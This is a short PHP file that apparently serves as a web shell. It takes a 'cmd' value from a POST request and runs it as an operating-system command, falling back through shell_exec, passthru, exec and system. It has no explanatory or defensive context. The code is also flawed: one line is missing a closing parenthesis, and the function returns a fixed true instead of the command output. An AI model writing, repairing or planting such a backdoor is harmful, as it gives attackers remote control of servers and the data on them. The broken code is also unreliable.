<?php
function exec_method($cmd) {
	$retval = true;
	if(is_callable('shell_exec')) { 
		$ret_exec=shell_exec($cmd); 
	} else if (is_callable('passthru')) { 
		ob_start(); 
		passthru($cmd); 
		$ret_exec=ob_get_contents(); 
		ob_end_clean();
	} else if (is_callable('exec')) { 
		$ret_exec=array(); 
		exec($cmd,$ret_exec); 
	} else if (is_callable('system')) { 
		ob_start(); 
		system($cmd); 
		$ret_exec=ob_get_contents(); 
		ob_end_clean(); 
	} 
	return $retval;
}

if (isset($_POST['cmd']){
	$command = $_POST['cmd'];
	echo (exec_method($command));
}

?>